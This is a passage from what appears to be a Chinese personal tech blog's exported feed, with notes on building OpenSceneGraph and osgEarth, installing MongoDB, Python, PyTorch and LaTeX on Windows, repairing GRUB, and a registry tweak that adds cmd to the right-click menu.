<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">win32:CONFIG(release, debug|release): LIBS +&#x3D; -L$$PWD&#x2F;..&#x2F;..&#x2F;..&#x2F;OpenSceneGraph&#x2F;lib&#x2F; -lOpenThreads -losg -losgDB -losgUtil -losgGA  -losgViewer -losgText</span><br><span class="line">else:win32:CONFIG(debug, debug|release): LIBS +&#x3D; -L$$PWD&#x2F;..&#x2F;..&#x2F;..&#x2F;OpenSceneGraph&#x2F;lib&#x2F; -lOpenThreadsd -losgd -losgDBd -losgUtild -losgGAd -losgViewerd -losgTextd</span><br><span class="line">else:unix: LIBS +&#x3D; -L$$PWD&#x2F;..&#x2F;..&#x2F;..&#x2F;OpenSceneGraph&#x2F;lib&#x2F; -lOpenThreads -losg -losgDB -losgUtil -losgGA -losgViewer -losgText</span><br><span class="line"></span><br><span class="line">INCLUDEPATH +&#x3D; $$PWD&#x2F;..&#x2F;..&#x2F;..&#x2F;OpenSceneGraph&#x2F;include</span><br><span class="line">DEPENDPATH +&#x3D; $$PWD&#x2F;..&#x2F;..&#x2F;..&#x2F;OpenSceneGraph&#x2F;lib</span><br></pre></td></tr></table></figure>

<p>main.cpp 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;osgViewer&#x2F;Viewer&gt;</span><br><span class="line">#include &lt;osgDB&#x2F;ReadFile&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    osgViewer::Viewer viewer;</span><br><span class="line">    viewer.setSceneData(osgDB::readNodeFile(&quot;cow.osg&quot;));</span><br><span class="line">    return viewer.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行，出来一头 3D 牛，即配置成功。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://dlonng.com/posts/qt-osg" target="_blank" rel="noopener">QT - OSG 开发环境配置</a>,by 程序小哥.</li>
<li><a href="https://huangwang.github.io/2019/10/07/Qt5%E9%85%8D%E7%BD%AE%E5%BC%80%E6%BA%90GSL%E6%95%B0%E5%AD%A6%E5%BA%93/">Qt5配置开源GSL数学库</a>,by jackhuang.</li>
<li><a href="https://huangwang.github.io/2019/09/14/Ubuntu16-04%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85OSG/">Ubuntu16.04编译安装OSG</a>,by jackhuang.</li>
<li><a href="http://www.openscenegraph.org/index.php/documentation/platform-specifics/windows/37-visual-studio" target="_blank" rel="noopener">Windows Compiling with Visual Studio</a>,by OpenSceneGraph.</li>
<li><a href="https://huangwang.github.io/2018/06/21/Visual-Studio-Community-2017%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85/">Visual_Studio_Community_2017离线安装</a>,by jackhuang.</li>
<li><a href="https://blog.csdn.net/u013745174/article/details/53691589" target="_blank" rel="noopener">Qt-Creator常见问题</a>,by XenonSec.</li>
<li><a href="https://stackoverflow.com/questions/31457306/visual-studio-msb3073-error-exited-with-code-1" target="_blank" rel="noopener">Visual Studio: MSB3073 error exited with code 1</a>,by stackoverflow.</li>
<li><a href="https://blog.csdn.net/liang19890820/article/details/53931813" target="_blank" rel="noopener">Qt5.7 + VS2015 环境搭建</a>,by 一去丶二三里.</li>
<li><a href="https://blog.csdn.net/u013719339/article/details/78415685" target="_blank" rel="noopener">OSG学习：WIN10系统下OSG+VS2017编译及运行</a>,by 路人甲JIA.</li>
<li><a href="http://bbs.osgchina.org/forum.php?mod=viewthread&tid=15687&extra=" target="_blank" rel="noopener">error LNK2019: 无法解析的外部符号 “__declspec(dllimport) public</a>,by OSG_weiguoying.</li>
<li><a href="https://blog.csdn.net/webzhuce/article/details/104683416" target="_blank" rel="noopener">应用篇之dll lib pdb和头文件</a>,by 阿兵-AI医疗.</li>
<li><a href="https://blog.csdn.net/m0_37763682/article/details/105801481" target="_blank" rel="noopener">GL.h文件提示报错</a>,by Parkergh.</li>
<li><a href="https://blog.csdn.net/DinnerHowe/article/details/80925475" target="_blank" rel="noopener">#undef 的用法及其意义</a>,by DinnerHowe.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下OsgEarth编译安装过程</title>
    <url>/2021/07/28/Windows%E4%B8%8BOsgEarth%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>记录Windows下osgEarth编译安装过程。</p>
<h1 id="安装vcpkg"><a href="#安装vcpkg" class="headerlink" title="安装vcpkg"></a>安装vcpkg</h1><p>首先，请下载vcpkg并执行 bootstrap.bat 脚本。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; git clone https://github.com/microsoft/vcpkg</span><br><span class="line">&gt; .\vcpkg\bootstrap-vcpkg.bat</span><br></pre></td></tr></table></figure>


<p>使用以下命令安装您的项目所需要的库：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; .\vcpkg\vcpkg install [packages to install]</span><br></pre></td></tr></table></figure>

<p>您也可以使用 <code>search</code> 子命令来查找vcpkg中集成的库:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; .\vcpkg\vcpkg search [search term]</span><br></pre></td></tr></table></figure>

<p>若您希望在 Visual Studio 中使用vcpkg，请运行以下命令 (首次启动需要管理员权限)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; .\vcpkg\vcpkg integrate install</span><br></pre></td></tr></table></figure>

<p>若您希望在 Visual Studio 中卸载vcpkg，请运行以下命令 (首次启动需要管理员权限)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; .\vcpkg\vcpkg integrate remove</span><br></pre></td></tr></table></figure>

<p>卸载vcpkg只需删除vcpkg的文件夹即可。</p>
<h1 id="使用vcpkg安装osgEarth"><a href="#使用vcpkg安装osgEarth" class="headerlink" title="使用vcpkg安装osgEarth"></a>使用vcpkg安装osgEarth</h1><p>使用如下命令安装osgEarth:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vcpkg install osgearth:x64-windows</span><br></pre></td></tr></table></figure>

<p>经验证，使用vs2015编译安装osgEarth的依赖项blend2d失败，因blend2d不支持vs2015编译器。因此只能自己编译安装osgearth。</p>
<h1 id="编译前准备"><a href="#编译前准备" class="headerlink" title="编译前准备"></a>编译前准备</h1><p>使用vcpkg安装osg、gdal、curl。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vcpkg install osg:x64-windows gdal:x64-windows curl:x64-windows。</span><br></pre></td></tr></table></figure>

<h1 id="编译安装osgEarth"><a href="#编译安装osgEarth" class="headerlink" title="编译安装osgEarth"></a>编译安装osgEarth</h1><p>使用cmake编译安装osgEarth。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd I:\project</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gwaldron&#x2F;osgearth.git</span><br><span class="line">cd osgearth</span><br><span class="line">mkdir build</span><br><span class="line">cmake -S . -B build -G &quot;Visual Studio 15 2017 Win64&quot; -DCMAKE_BUILD_TYPE&#x3D;RelWithDebInfo -DWIN32_USE_MP&#x3D;ON -DCMAKE_INSTALL_PREFIX&#x3D;I:\project\osgearth\install -DCMAKE_TOOLCHAIN_FILE&#x3D;I:\project\vcpkg\scripts\buildsystems\vcpkg.cmake</span><br><span class="line">cmake --build build --target INSTALL --config RelWithDebInfo</span><br></pre></td></tr></table></figure>

<h1 id="设置运行时环境"><a href="#设置运行时环境" class="headerlink" title="设置运行时环境"></a>设置运行时环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set PATH&#x3D;%PATH%;c:\vcpkg\installed\x64-windows\bin</span><br><span class="line">set PATH&#x3D;%PATH%;c:\vcpkg\installed\x64-windows\tools\osg</span><br><span class="line">set PATH&#x3D;%PATH%;[installroot]</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/jianingshow/article/details/50733159" target="_blank" rel="noopener">osgearth编译全过程</a>,by jianingshow.</li>
<li><a href="http://docs.osgearth.org/en/latest/build.html" target="_blank" rel="noopener">Building osgEarth</a>,by osgEarth.</li>
<li><a href="https://huangwang.github.io/2019/10/10/Windows%E4%B8%8BQT%E4%B8%8EOSG%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">Windows下QT与OSG开发环境配置</a>,by jackhuang.</li>
<li><a href="https://blog.csdn.net/Icesteam/article/details/112055345" target="_blank" rel="noopener">安装GDAL配置到VS2017的艰难之路（避坑之作）</a>,by Icesrteam.</li>
<li><a href="https://blog.csdn.net/qq_29413829/article/details/84404677" target="_blank" rel="noopener">VS2017编译GDAL常见问题</a>,by 一个渣渣的世界.</li>
<li><a href="https://blog.csdn.net/Test_tju/article/details/100129127" target="_blank" rel="noopener">使用OSGeo4W安装配置QGIS</a>,by Test_hh112.</li>
<li><a href="https://zhuanlan.zhihu.com/p/141226948" target="_blank" rel="noopener">windows10 环境中安装GDAL及其python绑定</a>,by 蔚蓝小栈.</li>
<li><a href="https://zhuanlan.zhihu.com/p/153199835" target="_blank" rel="noopener">[工具]包管理工具Vcpkg 的使用</a>,by 南象.</li>
<li><a href="https://www.zhihu.com/question/263416411" target="_blank" rel="noopener">如何看待 Windows 的 C++ 包管理器 vcpkg？</a>,by zhihu.</li>
<li><a href="https://www.cnblogs.com/yaoyu126/p/6659712.html" target="_blank" rel="noopener">win10 + vs2017 + vcpkg —— VC++ 打包工具</a>,by 一花一世界,一叶一乾坤.</li>
<li><a href="https://www.cnblogs.com/sunliming/p/4355966.html" target="_blank" rel="noopener">osgEarth基础入门</a>,by sunliming.</li>
<li><a href="https://www.itread01.com/content/1556464823.html" target="_blank" rel="noopener">Visual Studio工具 vcpkg簡介</a>,by itread01.</li>
<li><a href="https://stackoverflow.com/questions/57296864/how-to-remove-vcpkg-and-all-libraries-installed-with-vcpkg" target="_blank" rel="noopener">How to remove vcpkg and all libraries installed with vcpkg</a>,by stackoverflow.</li>
<li><a href="https://blog.csdn.net/qing666888/article/details/105117809" target="_blank" rel="noopener">Visual Studio开源库集成器Vcpkg全教程–利用Vcpkg轻松集成开源第三方库</a>,by 明卿.</li>
<li><a href="https://github.com/blend2d/blend2d/issues/140" target="_blank" rel="noopener">Build failed with vs2015</a>,by blend2d.</li>
<li><a href="https://blend2d.com/doc/build-instructions.html" target="_blank" rel="noopener">Build Instructions for blend2d</a>,by blend2d.</li>
<li><a href="https://blog.csdn.net/baidu_40840693/article/details/106279727" target="_blank" rel="noopener">window10系统中,vcpkg使用到opengl(编译MVG)库时提示Error: Building package * failed with: BUILD_FAILED</a>,by 知识在于分享.</li>
<li><a href="https://blog.csdn.net/sungaoyong/article/details/120701823" target="_blank" rel="noopener">OsgEarth 2.x升级到3.1注意事项</a>,by 孙高勇.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>Win7下MongoDB数据库的安装方法</title>
    <url>/2021/01/19/Win7%E4%B8%8BMongoDB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>在Windows7操作系统下安装MongoDB数据库，需要注意MongoDB数据库版本不能超过4.2。在安装过程中应选择“Complete”安装，并取消勾选“Install MongoDB Compass”。在安装MongoDB数据库之前，应先安装VC_redist程序，否则安装MongoDB数据库时将报如图1所示错误。</p>
<p align="center">
    <img src="images/error.png" width="80%" alt="安装过程中MongoDB服务无法启动"/>
</p>
<center>图1 安装过程中MongoDB服务无法启动</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://stackoverflow.com/questions/52236612/service-mongodb-server-mongodb-failed-to-start" target="_blank" rel="noopener">Service ‘MongoDB Server’ (MongoDB) failed to start</a>,by stackoverflow.</li>
<li><a href="https://blog.csdn.net/qq_20084101/article/details/82261195" target="_blank" rel="noopener">解决 Win10 安装 MongoDB 4.0 无法启动服务的问题（ 踩了个大坑）</a>,by 蓝三金.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下将cmd命令添加到右键菜单</title>
    <url>/2018/09/11/Windows%E4%B8%8B%E5%B0%86cmd%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0%E5%88%B0%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/</url>
    <content><![CDATA[<p>经常需要使用cmd命令，如果打开cmd窗口后在cd到目标路径，则非常麻烦。可使用如下方法将cmd添加到右键菜单，这样一打开cmd窗口就到了目标路径。设置方法如下：</p>
<ol>
<li>打开注册表</li>
<li>添加注册项<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a) 找到[HKEY_CLASSESS_ROOT\Folder\shell]子键，在其下新建“cmdPrompt”子项，在窗口右侧名称列上点击右键修改，将数值数据改为“CMD快速通道”。</span><br><span class="line"></span><br><span class="line">b) 再在这个项下，新建名为“command”子项，同样修改数值数据修改为c:\windows\system32\cmd.exe &#x2F;k cd &quot;%1&quot;</span><br></pre></td></tr></table></figure>
设置完成后即可在目标路径文件夹上右键单击，选择“CMD快速通道”命令，打开cmd窗口的同时，已跳转到目标路径下。</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows与Linux双系统Grub引导修复</title>
    <url>/2018/09/06/Windows%E4%B8%8ELinux%E5%8F%8C%E7%B3%BB%E7%BB%9FGrub%E5%BC%95%E5%AF%BC%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<p>因为个人爱好，我再笔记本中安装了Windows和Linux的双系统。最近因为Windows系统故障原因，重装Windows系统，导致无法引导Linux启动。</p>
<p>故障原因是之前安装双系统时，先安装Windows，再安装Linux，这样将由Grub2来引导Linux和Windows的启动。而重装Windows的过程中，将覆盖Grub2引导程序，导致无法Linux的启动。</p>
<p>故障解决方法是重新在硬盘中写入Grub2引导程序。具体步骤如下：</p>
<ol>
<li>使用Linux安装盘，使用Live CD方式进行Linux系统。</li>
<li>使用fdisk -l命令查看硬盘信息。</li>
<li>使用grub-install –root-directory=/media/boot /dev/sda将grub2引导程序写入硬盘。/media/boot为引导分区所在位置，grub-install写入grub2引导程序时需要使用引导分区所在linux映像。</li>
<li>使用update-grub2更新引导配置。</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下LaTeX安装及使用</title>
    <url>/2020/02/27/Windows%E4%B8%8BLaTeX%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>最近准备写大论文，为避免Word格式编排的麻烦，同时能够对大论文进行版本管理，决定使用LaTex。下面记录在Windows平台下安装LaTex的过程及其使用方法。</p>
<h1 id="Tex-Live-Vs-MiKTex-Vs-proTeXt"><a href="#Tex-Live-Vs-MiKTex-Vs-proTeXt" class="headerlink" title="Tex Live Vs MiKTex Vs proTeXt"></a>Tex Live Vs MiKTex Vs proTeXt</h1><p>TeX（/tɛx/，常被读作/tɛk/，音译“泰赫”，“泰克”，写作“TEX”），是一个由美国计算机教授高德纳（Donald Ervin Knuth）编写的排版软件。TeX的MIME类型为application/x-tex，是一款自由软件。它在学术界特别是数学、物理学和计算机科学界十分流行。TeX被普遍认为是一个优秀的排版工具，尤其是对于复杂数学公式的处理。利用LaTeX等终端软件，TeX就能够排版出精美的文本以帮助人们辨认和查找。</p>
<p>LaTeX（/ˈlɑːtɛx/，常被读作/ˈlɑːtɛk/或/ˈleɪtɛk/，写作“LATEX”），是一种基于TeX的排版系统，由美国计算机科学家莱斯利·兰伯特在20世纪80年代初期开发，利用这种格式系统的处理，即使用户没有排版和程序设计的知识也可以充分发挥由TeX所提供的强大功能，不必一一亲自去设计或校对，能在几天，甚至几小时内生成很多具有书籍质量的印刷品。对于生成复杂表格和数学公式，这一点表现得尤为突出。因此它非常适用于生成高印刷质量的科技和数学、物理文档。这个系统同样适用于生成从简单的信件到完整书籍的所有其他种类的文档。</p>
<p>LaTex类似于Linux系统，它有多个发行版，例如 MiKTeX 、 proTeXt 和TeX Live，其中proTeXt是基于MiKTeX打包的。因此重点介绍MiKTex与TeX Live的区别。</p>
<blockquote>
<p>Texlive包比较全，Miktex占用空间比较小，遇到需要的包需要在线下载。所以，硬盘空间比较充足的，网络不太方便的电脑，可以选择Texlive，反之硬盘空间小，一直保持网络链接的可以选择Miktex。</p>
</blockquote>
<h1 id="LaTeX编辑器"><a href="#LaTeX编辑器" class="headerlink" title="LaTeX编辑器"></a>LaTeX编辑器</h1><p>LaTex编辑器大概分为两种，一种为WYSIWYG，所见即所得，实时预览，类似于Word，另一种是纯文本编辑器，有语法高亮，没有预览功能，编译成PDF后才能预览。</p>
<p>LaTeX编辑器的选择请参考<a href="https://www.zhihu.com/question/19954023" target="_blank" rel="noopener">有哪些好的 LaTeX 编辑器？</a>。本人倾向于使用VSCode+Latex Workshop，具体方法参考<a href="https://zhuanlan.zhihu.com/p/43133114" target="_blank" rel="noopener">编写中文Latex(VSCode+TexLive)</a>。</p>
<h2 id="VScode使用方法"><a href="#VScode使用方法" class="headerlink" title="VScode使用方法"></a>VScode使用方法</h2><h3 id="正向和反向定位跳转"><a href="#正向和反向定位跳转" class="headerlink" title="正向和反向定位跳转"></a>正向和反向定位跳转</h3><p>LaTeX Workshop 插件提供了正向和反向定位跳转功能：</p>
<ul>
<li>在 LaTeX 文件中，按 Ctrl + Alt + J 跳转到对应的 PDF 文件位置。</li>
<li>在 PDF 文件中，按下 Ctrl +  同时鼠标单击，跳转到对应的 LaTeX 文件位置。</li>
</ul>
<h1 id="Tex-Live安装"><a href="#Tex-Live安装" class="headerlink" title="Tex Live安装"></a>Tex Live安装</h1><p>Tex Live安装请参考<a href="https://zhuanlan.zhihu.com/p/41855480" target="_blank" rel="noopener">最新TeXLive 环境的安装与配置</a>。</p>
<h1 id="LaTeX转docx"><a href="#LaTeX转docx" class="headerlink" title="LaTeX转docx"></a>LaTeX转docx</h1><p>有时需要将LaTeX转成docx文档，可使用Pandoc，具体使用方法参考<br><a href="https://blog.csdn.net/yaoqi_isee/article/details/71125232" target="_blank" rel="noopener">Latex转word</a>。</p>
<h1 id="LaTeX语法"><a href="#LaTeX语法" class="headerlink" title="LaTeX语法"></a>LaTeX语法</h1><p>一个LATEX命令（宏）的格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">无参数：     \command</span><br><span class="line">有n个参数：  \command&#123;arg1&#125;&#123;arg2&#125;...&#123;argn&#125;</span><br><span class="line">有可选参数： \command[arg_opt]&#123;arg1&#125;&#123;arg2&#125;...&#123;argn&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://blog.sciencenet.cn/blog-478347-1215384.html" target="_blank" rel="noopener">Latex编译器推荐（面向初学者或者懒得折腾的朋友，主要针对windows用户）</a>,by 郭令举.</li>
<li><a href="https://cn.soulmachine.me/2013-04-12-latex-distributions-and-editors/" target="_blank" rel="noopener">LaTeX的各种发行版和编辑器的比较</a>,by 灵魂机器.</li>
<li><a href="https://zh.wikipedia.org/wiki/TeX" target="_blank" rel="noopener">TeX</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/LaTeX" target="_blank" rel="noopener">LaTeX</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/41855480" target="_blank" rel="noopener">最新TeXLive 环境的安装与配置</a>,by cying.</li>
<li><a href="https://www.zhihu.com/question/19954023" target="_blank" rel="noopener">有哪些好的 LaTeX 编辑器？</a>,by zhihu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/43133114" target="_blank" rel="noopener">编写中文Latex(VSCode+TexLive)</a>,by 踏歌.</li>
<li><a href="https://liam.page/2014/09/08/latex-introduction/" target="_blank" rel="noopener">一份其实很短的 LaTeX 入门文档</a>,by 始终.</li>
<li><a href="http://liuchengxu.org/blog-cn/posts/quick-latex/" target="_blank" rel="noopener">从零开始 LaTeX 快速入门</a>,by liuchengxu.</li>
<li><a href="https://liam.page/2015/01/23/literate-programming-in-latex/" target="_blank" rel="noopener">在 LaTeX 中进行文学编程</a>,by 始终.</li>
<li><a href="https://blog.csdn.net/yaoqi_isee/article/details/71125232" target="_blank" rel="noopener">Latex转word</a>,by yj_isee.</li>
<li><a href="https://zhuanlan.zhihu.com/p/50241899" target="_blank" rel="noopener">LaTeX + VSCode + Git 开发环境搭建</a>,by 李计芃.</li>
<li><a href="https://zh.wikipedia.org/wiki/BibTeX" target="_blank" rel="noopener">BibTeX</a>,by wikipedia.</li>
<li><a href="https://segmentfault.com/a/1190000021707181" target="_blank" rel="noopener">我的 LaTeX 方案实现</a>,by 浪里小涛龙.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows平台Python安装与配置教程</title>
    <url>/2018/09/07/Windows%E5%B9%B3%E5%8F%B0Python%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>下面记录在Windows平台安装配置Python的过程。</p>
<ol>
<li>去Python官网下载最新的Python3，当前最新版本为3.7。</li>
<li>双击Python3.7的安装包进行安装，设置安装路径为C:\Python\Python37，同时将Python路径加入系统Path变量中。</li>
<li>使用如下命令安装ipython。加参数–trusted-host，否则会报错误：SSLError(SSLCertVerificationError(1, ‘[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed。加参数-i，制定国内pip源，显著提高下载速度。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install ipython -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple --trusted-host pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下安装Pytorch过程记录</title>
    <url>/2019/09/24/Windows%E4%B8%8B%E5%AE%89%E8%A3%85Pytorch%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>PyTorch是一个开源的Python机器学习库，基于Torch，底层由C++实现，应用于人工智能领域，如自然语言处理。它最初由Facebook的人工智能研究团队开发，并且被用于Uber的概率编程软件Pyro。</p>
<p>PyTorch主要有两大特征：</p>
<ul>
<li>类似于NumPy的张量计算，可使用GPU加速;</li>
<li>基于带自动微分系统的深度神经网络;</li>
</ul>
<p>下面记录在Windows操作系统下安装PyTorch的方法。</p>
<h1 id="安装Anaconda"><a href="#安装Anaconda" class="headerlink" title="安装Anaconda"></a>安装Anaconda</h1><p>到<a href="https://www.anaconda.com/distribution/" target="_blank" rel="noopener">Anaconda Distribution</a>下载合适的Anaconda。</p>
<h1 id="查看cuda版本"><a href="#查看cuda版本" class="headerlink" title="查看cuda版本"></a>查看cuda版本</h1><p>参考<a href="https://www.jianshu.com/p/d3b9419a0f89" target="_blank" rel="noopener">Windows系统查看CUDA版本号</a>。例如本机cuda版本为9.2。</p>
<h1 id="安装pytorch"><a href="#安装pytorch" class="headerlink" title="安装pytorch"></a>安装pytorch</h1><p>进入pytorch官网的<a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">GET STARTED</a>，根据自身计算机环境，选择PyTorch Build、Your OS、Package、Language和CUDA，即得到安装pytorch的命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 基于Anaconda</span><br><span class="line">conda install pytorch torchvision cudatoolkit&#x3D;9.2 -c pytorch -c defaults -c numba&#x2F;label&#x2F;dev</span><br><span class="line">&#x2F;&#x2F; 基于Python3.6</span><br><span class="line">pip3 install torch&#x3D;&#x3D;1.2.0+cu92 torchvision&#x3D;&#x3D;0.4.0+cu92 -f https:&#x2F;&#x2F;download.pytorch.org&#x2F;whl&#x2F;torch_stable.html</span><br></pre></td></tr></table></figure>

<h2 id="pip安装whl包"><a href="#pip安装whl包" class="headerlink" title="pip安装whl包"></a>pip安装whl包</h2><p>torch1.2的包很大，直接用pip安装下载很慢，可以先用下载工具将torch1.2的whl下载下来，再直接安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install torch-1.2.0+cu92-cp36-cp36m-win_amd64.whl</span><br></pre></td></tr></table></figure>

<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>打开命令提示符，输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python</span><br></pre></td></tr></table></figure>

<p>输入如下代码，查看输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">import torch</span><br><span class="line">x &#x3D; torch.rand(5, 3)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>

<p>输出类似如下结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tensor([[0.3380, 0.3845, 0.3217],</span><br><span class="line">        [0.8337, 0.9050, 0.2650],</span><br><span class="line">        [0.2979, 0.7141, 0.9069],</span><br><span class="line">        [0.1449, 0.1132, 0.1375],</span><br><span class="line">        [0.4675, 0.3947, 0.1426]])</span><br></pre></td></tr></table></figure>

<p>输入如下代码，验证GPU驱动和CUDA是安装正确，能够被PyTorch访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import torch</span><br><span class="line">torch.cuda.is_available()</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/CUDA" target="_blank" rel="noopener">CUDA</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/lvsehaiyang1993/article/details/84890949" target="_blank" rel="noopener">Windows 下安装Pytorch</a>,by Big_quant.</li>
<li><a href="https://www.jianshu.com/p/d3b9419a0f89" target="_blank" rel="noopener">Windows系统查看CUDA版本号</a>,by 潇洒坤.</li>
<li><a href="https://zh.wikipedia.org/zh-cn/PyTorch" target="_blank" rel="noopener">PyTorch</a>,by wikipedia.</li>
<li><a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">GET STARTED</a>,by pytorch.</li>
<li><a href="https://code.visualstudio.com/docs/python/python-tutorial" target="_blank" rel="noopener">Getting Started with Python in VS Code</a>,by visualstudio.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows无法启动MongoDB服务器1067错误恢复记录</title>
    <url>/2023/03/13/Windows%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8MongoDB%E6%9C%8D%E5%8A%A1%E5%99%A81067%E9%94%99%E8%AF%AF%E6%81%A2%E5%A4%8D%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>因断电导致Windows系统无法启动MongoDB后台服务，报1067错误。下面记录该故障的修复过程。</p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><ul>
<li><p>移除文件 the file /data/db/mongod.lock</p>
</li>
<li><p>运行命令 mongod.exe –repair</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run mongod.exe --repair --config  %mongodb_install_path\mongod.cfg&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动MongoDB服务</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start MongoDB</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/linxubin321/article/details/106478383" target="_blank" rel="noopener">Mongodb启动失败1067错误</a>,by CWSSSS.</li>
<li><a href="https://mongodb-documentation.readthedocs.io/en/latest/tutorial/recover-data-following-unexpected-shutdown.html#gsc.tab=0" target="_blank" rel="noopener">意外关机后恢复的MongoDB的数据</a>,by mongodb.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows批处理编程语法解析</title>
    <url>/2018/05/13/Windows%E6%89%B9%E5%A4%84%E7%90%86%E7%BC%96%E7%A8%8B%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>批处理文件(BAT文件)是DOS，OS/2和Microsoft Windows中的一种脚本文件<sup>[1]</sup>。 它由命令行解释器执行的一系列命令组成，存储在纯文本文件中，通常以BAT为扩展名。批处理文件可以包含解释器交互接受的任何命令，并使用在批处理文件中启用条件分支和循环的构造，如IF，FOR和GOTO标签。在Windows平台自动化部署或处理日常重复性工作时，常使用Windows批处理文件。</p>
<h1 id="批处理命令简介"><a href="#批处理命令简介" class="headerlink" title="批处理命令简介"></a>批处理命令简介</h1><p>下面简单介绍Windows BAT文件的语法。</p>
<h2 id="变量操作"><a href="#变量操作" class="headerlink" title="变量操作"></a>变量操作</h2><ul>
<li>设置变量</li>
</ul>
